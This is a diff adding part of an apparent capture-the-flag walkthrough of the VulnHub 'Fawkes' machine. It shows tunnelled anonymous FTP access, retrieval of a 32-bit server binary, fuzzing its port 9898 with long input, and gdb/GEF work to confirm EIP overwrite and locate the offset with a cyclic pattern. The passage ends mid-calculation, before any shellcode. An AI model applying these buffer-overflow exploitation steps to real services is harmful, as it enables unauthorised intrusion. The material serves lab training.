@@ -2059,6 +2059,765 @@ Nmap done: 1 IP address (1 host up) scanned in 66.07 seconds
 ```
 it  works xD agradecido con el de arriba
 
+to visualize port 80 we hae to use foxyproxy 
+go to options > add > name > fawkes > proxyType > SOCKS5 > proxy Ip > 127.0.0.1 > PORT > in our case will 8888 because of this ```2023/05/02 12:55:17 server: session#2: tun: proxy#R:127.0.0.1:8888=>socks: Listening ```
+
+now we are able to watch the port 80, nevertheless we are not able find anything seems that is a page with an image just like that
+
+and i am able to use FTP because of por 21 is open 
+
+so let's enumerate it 
+prxychains + ftp + ip will be 
+
+```bash
+ proxychains ftp 192.168.100.130
+```
+
+output
+
+```
+ProxyChains-3.1 (http://proxychains.sf.net)
+|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
+|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:21-<><>-OK
+Connected to 192.168.100.130.
+220 (vsFTPd 3.0.3)
+Name (192.168.100.130:z3kk3n):
+```
+
+you have to specify the user anonymous because is the invite user you don't have to use credentials to this user just press enter if ftp ask you for password
+```bash
+Name (192.168.100.130:z3kk3n): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+```
+
+now we have to list the sharing folders via ftp
+
+```bash
+ftp> dir
+500 Illegal PORT command.
+ftp: bind: Address already in use
+ftp> help
+```
+this happens because we are using proxychains but if we set the passive mode we can use ftp service even though with proxychains 
+```
+ftp> help
+Commands may be abbreviated.  Commands are:
+
+!		dir		mdelete		qc		site
+$		disconnect	mdir		sendport	size
+account		exit		mget		put		status
+append		form		mkdir		pwd		struct
+ascii		get		mls		quit		system
+bell		glob		mode		quote		sunique
+binary		hash		modtime		recv		tenex
+bye		help		mput		reget		tick
+case		idle		newer		rstatus		trace
+cd		image		nmap		rhelp		type
+cdup		ipany		nlist		rename		user
+chmod		ipv4		ntrans		reset		umask
+close		ipv6		open		restart		verbose
+cr		lcd		prompt		rmdir		?
+delete		ls		passive		runique
+debug		macdef		proxy		send
+ftp> passive
+Passive mode on.
+ftp> dir
+227 Entering Passive Mode (192,168,100,130,203,149).
+|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:52117-<><>-OK
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
+```
+to get the resources and analyze them using out tools we have to use get
+ejm 
+```
+seems to be a binary so we have to use the binary mode as well
+ftp> binary
+200 Switching to Binary mode.
+
+get + resource 
+
+get server_hogwarts
+local: server_hogwarts remote: server_hogwarts
+227 Entering Passive Mode (192,168,100,130,198,92).
+|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:50780-<><>-OK
+150 Opening BINARY mode data connection for server_hogwarts (705996 bytes).
+45
+```
+
+ctrl + c and let's check the binary 
+
+# Precheck BufferOverFlow
+
+seems that we have to dubug that app because of this 
+
+```
+❯ file server_hogwarts
+server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped
+```
+
+according with this output we can say that we have to fight againts of 32 bits binary 
+
+strace tool
+
+```bash 
+
+❯ strace ./server_hogwarts
+execve("./server_hogwarts", ["./server_hogwarts"], 0x7ffe3a1adc10 /* 34 vars */) = 0
+[ Process PID=88833 runs in 32 bit mode. ]
+brk(NULL)                               = 0x84b5000
+brk(0x84b57c0)                          = 0x84b57c0
+set_thread_area({entry_number=-1, base_addr=0x84b52c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
+uname({sysname="Linux", nodename="parrot", ...}) = 0
+readlink("/proc/self/exe", "/home/z3kk3n/Desktop/vulnHUB/faw"..., 4096) = 59
+brk(0x84d67c0)                          = 0x84d67c0
+brk(0x84d7000)                          = 0x84d7000
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No existe el fichero o el directorio)
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+setsockopt(3, SOL_SOCKET, SO_REUSEPORT, [1], 4) = 0
+bind(3, {sa_family=AF_INET, sin_port=htons(9898), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
+listen(3, 3)                            = 0
+accept(3, 
+```
+according with this output ```sin_port=htons(9898)``` when the service is open the app open a port 9898 let's verify 
+
+if we execute the ```./server_hogwarts``` 
+we will try to connect via port 9898,because  we saw that it opens on the strace output, 
+lets check 
+
+
+```bash
+nc localhost 9898
+```
+
+and it connect us 
+
+```bash 
+❯ nc localhost 9898
+Welcome to Hogwart's magic portal
+Tell your spell and ELDER WAND will perform the magic
+
+Here is list of some common spells:
+1. Wingardium Leviosa
+2. Lumos
+3. Expelliarmus
+4. Alohomora
+5. Avada Kedavra 
+
+Enter your spell: 
+
+```
+
+# BOF enumeration 
+if we try to connnect in port 9898 of 192.168.100.130 using proxychains 
+
+if it allow us we can enumerate the BOF in order to find if it's vulneral to bof 
+
+let's check 
+
+```proxychains nc 192.168.100.130 9898```
+
+output
+
+```bash
+❯ proxychains nc 192.168.100.130 9898
+ProxyChains-3.1 (http://proxychains.sf.net)
+|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
+|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:9898-<><>-OK
+Welcome to Hogwart's magic portal
+Tell your spell and ELDER WAND will perform the magic
+
+Here is list of some common spells:
+1. Wingardium Leviosa
+2. Lumos
+3. Expelliarmus
+4. Alohomora
+5. Avada Kedavra 
+
+Enter your spell: 
+```
+it allow us 
+
+so guessing that the programmer did not sanitized the program and checking that the options that we are able to use are a short size of bytes we can input AA in order to make a segmentation fault if it says while i am running the program it's because it has the vulnerability called BOF  
+
+check seems thatit's vulneral at bof
+
+My input
+```bash
+❯ nc localhost 9898
+Welcome to Hogwart's magic portal
+Tell your spell and ELDER WAND will perform the magic
+
+Here is list of some common spells:
+1. Wingardium Leviosa
+2. Lumos
+3. Expelliarmus
+4. Alohomora
+5. Avada Kedavra 
+
+Enter your spell: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+```
+
+
+output from the program
+```bash 
+❯ ./server_hogwarts
+Error from clientzsh: segmentation fault  ./server_hogwarts
+```
+# BOF trying to corrupt the program
+explanaition 
+we verify before the AAA's to make sure that we could exceed the size of the buffer assign it by the programmer when if you exceed the buffer assign it by the programmer you start to write on EBP - RET which is the EIP  the instrction pointer and we can take adventage of it 
+
+the idea is to corrupt the program we have to measure how many "AAA" we have to add in order to write the esp and the eip 
+
+to measure that we have to use gdb tool
+
+```gdb + program + -q ``` ejm
+
+```bash
+gdb ./service_howarts -q
+```
+now we have to launch the program by write 'r'
+
+```bash
+Error from clientzsh: segmentation fault  ./server_hogwarts
+❯ gdb ./server_hogwarts -q
+GEF for linux ready, type `gef' to start, `gef config' to configure
+90 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.01ms using Python engine 3.9
+Reading symbols from ./server_hogwarts...
+(No debugging symbols found in ./server_hogwarts)
+gef➤  r
+Starting program: /home/z3kk3n/Desktop/vulnHUB/fawkes/content/server_hogwarts 
+[*] Failed to find objfile or not a valid file format: [Errno 2] No existe el fichero o el directorio: 'system-supplied DSO at 0xf7ffc000'
+
+```
+
+now if we try to add again the "AA" in order to find if we write the eip + esp
+from another terminal we open the program just like we did before
+
+```nc localhost 9898``` and if we add the AA let's check the output of the program 
+
+output from gef
+
+```bash
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffcd8c  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebx   : 0x41414141 ("AAAA"?)
+$ecx   : 0xffffd350  →  "our spell: "
+$edx   : 0xffffd194  →  "our spell: "
+$esp   : 0xffffce00  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0x80b3158  →  "../csu/libc-start.c"
+$edi   : 0xffffd348  →  "\nEnter your spell: "
+$eip   : 0x41414141 ("AAAA"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffce00│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	← $esp
+0xffffce04│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffce08│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffce0c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffce10│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffce14│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffce18│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffce1c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x41414141
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "server_hogwarts", stopped 0x41414141 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Look right here the value of ```$eip   : 0x41414141 ("AAAA"?)``` is AAAA take under consideration that ```eip``` it's very important because it's the instruction pointer is the object in charge of pointing to the next address that the program flow has to go to in order to interpret new instructions
+
+the reason of the segmentation fault is because AAA does not exist and eip is trying to get something from there and what eip found was AAA because of us. that's where we have to inyect our code instead if AAA to give to eip a new address to point in a nutshell in order to gain access
+
+almost forgot 
+
+you have to check the security of the program, using gef you have to tell gef ```checksec``` ex
+
+```bash
+gef➤  checksec
+[+] checksec for '/home/z3kk3n/Desktop/vulnHUB/fawkes/content/server_hogwarts'
+[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
+Canary                        : ✓ (value: 0xfe728800)
+NX                            : ✘ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : ✘ 
+gef➤  
+```
+according with this output seems that 
+NX is disable --> means that it allow us to pointing to the next address that the program flow has to go to in order to interpret new instructions (shellcode allowed )
+PIE is disable --> 
+RelRO is disable -->  
+
+to measure where eip values something, we will work with gef + pattern create
+
+```bash
+gef➤  pattern create
+[+] Generating a pattern of 1024 bytes (n=4)
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
+[+] Saved as '$_gef1'
+gef➤  
+
+```
+
+now that code we have to paste where we are using the program
+
+```bash
+❯ nc localhost 9898
+Welcome to Hogwart's magic portal
+Tell your spell and ELDER WAND will perform the magic
+
+Here is list of some common spells:
+1. Wingardium Leviosa
+2. Lumos
+3. Expelliarmus
+4. Alohomora
+5. Avada Kedavra 
+
+Enter your spell: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
+```
+
+chekcing the output of gef we measures eip 
+
+```bash
+$eax   : 0xffffcd8c  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
+$ebx   : 0x62616162 ("baab"?)
+$ecx   : 0xffffd350  →  "our spell: "
+$edx   : 0xffffd194  →  "our spell: "
+$esp   : 0xffffce00  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
+$ebp   : 0x62616163 ("caab"?)
+$esi   : 0x80b3158  →  "../csu/libc-start.c"
+$edi   : 0xffffd348  →  "\nEnter your spell: "
+$eip   : 0x62616164 ("daab"?)
+$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffce00│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"	← $esp
+0xffffce04│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
+0xffffce08│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
+0xffffce0c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
+0xffffce10│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
+0xffffce14│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
+0xffffce18│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
+0xffffce1c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x62616164
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "server_hogwarts", stopped 0x62616164 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  
+
+
+```
+
+where eip values ```$eip   : 0x62616164 ("daab"?)``` daab
+
+let's check how many AAA we have to add until we reach ```daab```
+
+using echo 
+
+```bash 
+[root@parrot]─[/home/z3kk3n]
+└──╼ #echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak" | grep daab
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab ```daab```
